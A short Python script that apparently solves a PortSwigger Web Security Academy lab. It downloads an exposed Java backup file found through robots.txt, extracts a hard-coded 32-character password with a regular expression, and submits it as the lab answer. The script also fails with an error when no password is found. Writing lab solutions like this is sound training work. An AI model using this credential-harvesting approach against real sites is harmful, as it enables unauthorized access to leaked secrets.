import requests
from bs4 import BeautifulSoup
import re
# Lab Url
# https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files

# Enter URL
host = input('Enter Host without "/" in the end: ')
product_template_endpoint = "/backup/ProductTemplate.java.bak" # found in /robots.txt

# requesting the page to get the password
response = requests.get(url=host+product_template_endpoint)

# Regular expression to find the password
pattern = r'"(\w{32})"'
# Search for the pattern in the Java code
match = re.search(pattern, response.text)

if match:
    password = match.group(1)
    print(f'Password: {password}')
else:
    print('Password not found')

data = {'answer': password}
answer_submition = f"{host}/submitSolution"
requests.post(url=answer_submition, data=data)